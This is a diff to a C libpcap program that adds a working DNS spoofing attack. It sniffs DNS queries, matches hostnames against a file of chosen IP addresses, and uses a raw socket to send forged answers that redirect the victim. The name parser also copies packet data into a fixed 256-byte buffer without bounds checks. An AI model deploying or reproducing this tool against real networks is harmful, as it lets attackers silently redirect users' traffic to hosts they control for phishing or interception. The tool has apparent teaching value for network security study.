@@ -14,7 +14,6 @@
 #include <netinet/in.h>
 #include <net/if.h>
 
-
 /* Offsets of fields in the DNS header. */
 #define DNS_ID      0
 #define DNS_FLAGS   2
@@ -67,43 +66,117 @@ struct sniff_udp {
 #define SIZE_UDP        8               /* length of UDP header */
 
 struct DNS_HEADER {
-	unsigned short id; // identification number
-	unsigned short flags; 
-	unsigned short q_count; // number of question entries
-	unsigned short ans_count; // number of answer entries
-	unsigned short auth_count; // number of authority entries
-	unsigned short add_count; // number of resource entries
-}__attribute__((packed));
-
-//Constant sized fields of query structure
-struct QUESTION {
-        unsigned short qtype;
-        unsigned short qclass;
+        unsigned        id :16;         /* query identification number */
+#if BYTE_ORDER == BIG_ENDIAN
+                        /* fields in third byte */
+        unsigned        qr: 1;          /* response flag */
+        unsigned        opcode: 4;      /* purpose of message */
+        unsigned        aa: 1;          /* authoritive answer */
+        unsigned        tc: 1;          /* truncated message */
+        unsigned        rd: 1;          /* recursion desired */
+                        /* fields in fourth byte */
+        unsigned        ra: 1;          /* recursion available */
+        unsigned        unused :3;      /* unused bits (MBZ as of 4.9.3a3) */
+        unsigned        rcode :4;       /* response code */
+#endif
+#if BYTE_ORDER == LITTLE_ENDIAN || BYTE_ORDER == PDP_ENDIAN
+                        /* fields in third byte */
+        unsigned        rd :1;          /* recursion desired */
+        unsigned        tc :1;          /* truncated message */
+        unsigned        aa :1;          /* authoritive answer */
+        unsigned        opcode :4;      /* purpose of message */
+        unsigned        qr :1;          /* response flag */
+                        /* fields in fourth byte */
+        unsigned        rcode :4;       /* response code */
+        unsigned        unused :3;      /* unused bits (MBZ as of 4.9.3a3) */
+        unsigned        ra :1;          /* recursion available */
+#endif
+                        /* remaining bytes */
+        unsigned        qdcount :16;    /* number of question entries */
+        unsigned        ancount :16;    /* number of answer entries */
+        unsigned        nscount :16;    /* number of authority entries */
+        unsigned        arcount :16;    /* number of resource entries */
 };
-      
-//Constant sized fields of the resource record structure
-    struct R_DATA
-    {
+
+unsigned char* ReadName(const unsigned char* reader, int* count)
+{
+	unsigned char *name;
+	unsigned int p=0,jumped=0,offset;
+	int i , j;
+ 
+	*count = 1;
+	name = (unsigned char*)malloc(256);
+ 
+	name[0]='\0';
+ 
+	//read the names in 3www6google3com format
+	while(*reader!=0)
+	{
+		name[p++]=*reader;
+		reader=reader+1;
+ 
+		if(jumped==0)
+			*count = *count + 1; //if we havent jumped to another location then we can count up
+	}
+ 
+	name[p]='\0'; //string complete
+	if(jumped==1) 
+	{
+		*count = *count + 1; //number of steps we actually moved forward in the packet
+	}
+ 
+    //now convert 3www6google3com0 to www.google.com
+	for(i=0;i<(int)strlen((const char*)name);i++)
+	{
+		p=name[i];
+		for(j=0;j<(int)p;j++)
+		{
+			name[i]=name[i+1];
+			i=i+1;
+		}
+		name[i]='.';
+	}
+     
+	name[i-1]='\0'; //remove the last dot
+     
+	return name;
+}
+
+//this will convert www.google.com to 3www6google3com ;got it :)
+void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host)
+{
+	int lock=0 , i;
+
+	strcat((char*)host,"."); 
+	for(i=0 ; i<(int)strlen((char*)host) ; i++)
+	{
+		if(host[i]=='.')
+		{
+			*dns++=i-lock;
+			for(;lock<i;lock++)
+			{
+				*dns++=host[lock];
+			}
+			lock++; //or lock=i+1;
+		}
+	}
+	*dns++='\0';
+}
+
+struct QUESTION
+{
+	unsigned short qtype;
+	unsigned short qclass;
+};
+
+struct RES_RECORD {
+        unsigned short name;
         unsigned short type;
         unsigned short _class;
         unsigned int ttl;
         unsigned short data_len;
-    };
-      
-//Pointers to resource record contents
-    struct RES_RECORD
-    {
-        unsigned char *name;
-        struct R_DATA *resource;
-        unsigned char *rdata;
-    };
-      
-//Structure of a Query
-    typedef struct
-    {
-        unsigned char *name;
-        struct QUESTION *ques;
-    } QUERY;
+        unsigned int rdata;
+}__attribute__((packed));
 
 struct map {
         char hostnames[100][100];
@@ -146,20 +219,104 @@ int search_hostname(unsigned char *args, char *str) {
 	return -1;
 }
 
+static void print_ip_packet(const struct sniff_ip *ip, struct sniff_ip *resp_ip) {
+
+	printf("(Query IP) From : %s ", inet_ntoa(ip->ip_src));
+	printf("(Response IP) From : %s\n", inet_ntoa(resp_ip->ip_src));
+	printf("(Query IP) To : %s ", inet_ntoa(ip->ip_dst));
+	printf("(Response IP) To : %s\n", inet_ntoa(resp_ip->ip_dst));
+	printf("(Query IP) Len : %d ", ntohs(ip->ip_len));
+	printf("(Response IP) Len : %d\n", ntohs(resp_ip->ip_len));
+	printf("(Query IP) TTL : %d ", ip->ip_ttl);
+	printf("(Response IP) TTL : %d\n", resp_ip->ip_ttl);
+}
+
+static void print_udp_packet(const struct sniff_udp *udp, struct sniff_udp *resp_udp) {
+
+	printf("(Query UDP) From : %d ", ntohs(udp->uh_sport));
+	printf("(Response UDP) From : %d\n", ntohs(resp_udp->uh_sport));
+	printf("(Query UDP) To : %d ", ntohs(udp->uh_dport));
+	printf("(Response UDP) To : %d\n", ntohs(resp_udp->uh_dport));
+	printf("(Query UDP Len : %d ", ntohs(udp->uh_ulen));
+	printf("(Response UDP Len : %d\n", ntohs(resp_udp->uh_ulen));
+	printf("(Query UDP) Sum : %d ", ntohs(udp->uh_sum));
+	printf("(Response UDP) Sum : %d\n", ntohs(resp_udp->uh_sum));
+}
+
+static void print_dns_packet(const struct DNS_HEADER *dns, struct DNS_HEADER *resp_dns) {
+
+   	printf("(Query DNS) ID : %d ", ntohs(dns->id));	
+     	printf("(Response DNS) ID : %d\n", ntohs(resp_dns->id));
+	printf("(Query DNS) qr : %d ", dns->qr);
+	printf("(Response DNS) qr : %d\n", resp_dns->qr);
+	printf("(Query DNS) opcode : %d ", dns->opcode);
+	printf("(Response DNS) opcode : %d\n", resp_dns->opcode);
+	printf("(Query DNS) AA : %d ", dns->aa);
+	printf("(Response DNS) AA : %d\n", resp_dns->aa);
+	printf("(Query DNS) TC : %d ", dns->tc);
+	printf("(Response DNS) TC : %d\n", resp_dns->tc);
+	printf("(Query DNS) RD : %d ", dns->rd);
+	printf("(Response DNS) RD : %d\n", resp_dns->rd);
+	printf("(Query DNS) RA : %d ", dns->ra);
+	printf("(Response DNS) RA : %d\n", resp_dns->ra);
+	printf("(Query DNS) Z : %d ", dns->unused);
+	printf("(Response DNS) Z : %d\n", resp_dns->unused);
+	printf("(Query DNS) Rcode : %d ", dns->rcode);
+	printf("(Response DNS) Rcode : %d\n", resp_dns->rcode);
+	printf("(Query DNS) QD Count : %d ", ntohs(dns->qdcount));
+	printf("(Response DNS) QD Count : %d\n", ntohs(resp_dns->qdcount));
+	printf("(Query DNS) AN Count : %d ", ntohs(dns->ancount));
+	printf("(Response DNS) AN Count : %d\n", ntohs(resp_dns->ancount));
+	printf("(Query DNS) NS Count : %d ", ntohs(dns->nscount));
+	printf("(Response DNS) NS Count : %d\n", ntohs(resp_dns->nscount));
+	printf("(Query DNS) AR Count : %d ", ntohs(dns->arcount));
+	printf("(Response DNS) AR Count : %d\n", ntohs(resp_dns->arcount));
+}
+
+static void print_query_packet(char *qname, struct QUESTION *question) {
+	
+	printf("qname : %s\n", qname);
+	printf("Q Type : %d\n", ntohs(question->qtype));
+	printf("Q Class : %d\n", ntohs(question->qclass));
+}
+
+static void print_response_packet(struct RES_RECORD *response) {
+
+	struct in_addr source;
+		
+	printf("Response Type : %d\n", ntohs(response->type));
+	printf("Response Class : %d\n", ntohs(response->_class));
+	printf("Response TTL : %d\n", response->ttl);
+	printf("Response Data Len : %d\n", ntohs(response->data_len));
+	memset(&source, 0, sizeof(source));
+	source.s_addr = response->rdata;
+	printf("Response rdata : %s\n", inet_ntoa(source));
+}
+
 /*
  *  * dissect/print packet
  *   */
 void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	const struct sniff_ip *ip;              /* The IP header */
+	struct sniff_ip *resp_ip;
 	const struct sniff_udp *udp;		/* The UDP header*/
-	int size_ip;
+	struct sniff_udp *resp_udp;
+	int size_ip, count = 0;
 	bool frthr_analysis = false;
-	unsigned offset = 0;
-	struct DNS_HEADER *dns;
-	struct QUESTION *question;
+	unsigned offset = 0, resp_offset = 0;
+	struct DNS_HEADER *dns, *resp_dns;
+	struct QUESTION *question, *resp_question;
+	char *qname;
+	const u_char *temp;
+	unsigned int p = 0;
+	int i, j, index;
+	struct map *Map1;
+	struct RES_RECORD *response, *resp_response;
+	unsigned char buf[65536];
 
-	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);
+	memset(buf, 0, 65536);
+	ip = (struct sniff_ip*)(packet + SIZE_ETHERNET);	
 	size_ip = IP_HL(ip)*4;
 
 //	if (size_ip < 20) {
@@ -183,21 +340,130 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 			return;
 	}
 
-	if (frthr_analysis) {
-	
+	if (frthr_analysis) {	
 		/* define/compute udp header offset */
                 udp = (struct sniff_udp*)(packet + SIZE_ETHERNET + size_ip);
 
 		if (ntohs(udp->uh_dport) == 53) {
 			/* print source and destination IP addresses */
-			printf("       From: %s\n", inet_ntoa(ip->ip_src));
-			printf("         To: %s\n", inet_ntoa(ip->ip_dst));
-			printf("   Src port: %d\n", ntohs(udp->uh_sport));
-			printf("   Dst port: %d\n", ntohs(udp->uh_dport));
 			offset = SIZE_ETHERNET + size_ip + SIZE_UDP;  
 			dns = (struct DNS_HEADER *)(packet + offset);
  
-     			printf("DNS ID : %d\n", ntohs(dns->id));
+			offset += DNS_HDRLEN;
+			/* Parse the QNAMe until \0 */
+			temp = packet + offset;
+			int qname_len = 0, stop = 0;
+
+			qname = ReadName(temp, &qname_len);
+			printf("Query Name : %s\n", qname);
+			question = (struct QUESTION *)(temp + qname_len);
+			/*Query*/
+
+			Map1 = (struct map*)args;
+			index = search_hostname((unsigned char*)Map1, qname);
+        		if (index != -1) {
+//                		printf("IP : %s\n", Map1->ip_addrs[index]);
+			/*Response IP Header*/
+				resp_ip = (struct sniff_ip*)&buf;
+				memcpy(resp_ip, ip, size_ip);
+//				printf("Response Offset : %d\n", resp_offset);
+				resp_offset = resp_offset + size_ip;
+//				printf("Response Offset : %d\n", resp_offset);
+				/*Swap the src and dest*/
+				resp_ip->ip_src.s_addr = ip->ip_dst.s_addr;
+				resp_ip->ip_dst.s_addr = ip->ip_src.s_addr;
+				/*Change the TTL*/
+				resp_ip->ip_ttl = 255;
+			/*Response UDP Header*/
+				resp_udp = (struct sniff_udp*)&buf[resp_offset];
+				memcpy(resp_udp, udp, SIZE_UDP);
+				resp_offset = resp_offset + SIZE_UDP;
+//				printf("Response Offset : %d\n", resp_offset);
+				/*Swap source and destination Ports*/
+				resp_udp->uh_sport = udp->uh_dport;
+				resp_udp->uh_dport = udp->uh_sport;
+				/*Make UDP checksum as 0*/
+				resp_udp->uh_sum = 0;
+			/*Response DNS Header*/
+				resp_dns = (struct DNS_HEADER*)&buf[resp_offset];
+				memcpy(resp_dns, dns, DNS_HDRLEN);
+				resp_offset = resp_offset + DNS_HDRLEN;
+//				printf("Response Offset : %d\n", resp_offset);
+				/*Change response flag*/
+				resp_dns->qr = 1;
+				/*Change Recursive Available*/
+				resp_dns->ra = 1;
+				/*Change Unused bits*/
+				resp_dns->unused = 0;
+				/*Change answer count*/
+				resp_dns->ancount = htons(1);
+				/*Update Additional count to 0*/
+				resp_dns->arcount = 0;
+			/*Response Query Header*/
+				/*Blindly copy the query part from incoming packet*/
+				memcpy(&buf[resp_offset], packet + (SIZE_ETHERNET + size_ip + SIZE_UDP + DNS_HDRLEN),
+							qname_len + sizeof(struct QUESTION));
+				resp_offset = resp_offset + (qname_len + sizeof(struct QUESTION));
+//				printf("Response Offset : %d\n", resp_offset);
+			/*Response Answer Header & Pay Load*/		
+				response = (struct RES_RECORD *)malloc(sizeof(struct RES_RECORD));
+
+				response->name = htons(49164);
+				response->type = htons(1);
+				response->_class = htons(1);
+				response->ttl = htonl(6000);
+				response->data_len = htons(4);
+				inet_pton(AF_INET, Map1->ip_addrs[index], &response->rdata);
+					
+				/*Copy the response*/
+				memcpy(&buf[resp_offset], response, sizeof(struct RES_RECORD));
+				resp_offset = resp_offset + sizeof(struct RES_RECORD);
+//				printf("Response Offset : %d\n", resp_offset);
+				
+				free(response);
+
+				/*Update IP packet Total Length*/
+				resp_ip->ip_len = htons(resp_offset);
+
+				/*Change UDP Packet Total Length*/
+				resp_udp->uh_ulen = htons(ntohs(resp_ip->ip_len) - size_ip);
+
+/*				print_ip_packet(ip, (struct sniff_ip *)&buf);
+				print_udp_packet(udp, (struct sniff_udp *)&buf[size_ip]);
+				print_dns_packet(dns, (struct DNS_HEADER *)&buf[size_ip + SIZE_UDP]);
+				char *qname1;
+				qname_len = 0;
+				qname1 = ReadName(&buf[size_ip + SIZE_UDP + DNS_HDRLEN], &qname_len);
+				print_query_packet(qname1, (struct QUESTION*)&buf[size_ip + 
+								SIZE_UDP + DNS_HDRLEN + qname_len]);
+				free(qname1);
+				print_response_packet((struct RES_RECORD *)&buf[size_ip +
+								SIZE_UDP + DNS_HDRLEN + qname_len 
+								+ sizeof(struct QUESTION)]); */
+				int sock = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
+				int one = 1;
+				const int *val = &one;
+				if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
+					printf ("Error setting IP_HDRINCL. Error number : %d. Error message : %s \n" , errno , strerror(errno));
+					exit(0);
+                		}
+
+				int sent;
+				struct sockaddr_in dest;
+				dest.sin_family=AF_INET;
+				dest.sin_port=htons(53);
+				dest.sin_addr.s_addr = resp_ip->ip_dst.s_addr;
+
+				if( (sent = sendto(sock, (char*)buf, ntohs(resp_ip->ip_len), 0, 
+					(struct sockaddr*)&dest, sizeof(dest))) < 0) {
+					perror("Send packet Failed");
+				} else {
+					printf("SuccessFully sent Answer : %s (%d)\n", Map1->ip_addrs[index], sent);
+				}
+			} else {
+				printf("No spoofed IP found for this Hostname\n");
+			}
+			free(qname);
 		}
 	}
 }
@@ -252,9 +518,9 @@ out:
 	for (index = optind; index < argc; index++)
 		expr = argv[index];
 
-	printf("interface : %s\n", interface);
-	printf("file : %s\n", file);
-	printf("expr : %s\n", expr);
+//	printf("interface : %s\n", interface);
+//	printf("file : %s\n", file);
+//	printf("expr : %s\n", expr);
 
 	if (file) {
 		filePtr = fopen(file, "r");
@@ -304,10 +570,10 @@ out:
 	}
 
 //	print_something((unsigned char*)Map1);
-	index = search_hostname((unsigned char*)Map1, "www.fsl.com");
-	if (index != -1) {
-		printf("IP : %s\n", Map1->ip_addrs[index]);
-	}
+//	index = search_hostname((unsigned char*)Map1, "www.fsl.com");
+//	if (index != -1) {
+//		printf("IP : %s\n", Map1->ip_addrs[index]);
+//	}
 
 	if (!interface) {
 		interface = pcap_lookupdev(errbuf);
@@ -317,7 +583,7 @@ out:
                 }
 	}
 
-	handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
+	handle = pcap_open_live(interface, BUFSIZ, 1, -1, errbuf);
 	if (!handle) {
 		fprintf(stderr, "Couldn't open device : %s\n", errbuf);
 		return (2);
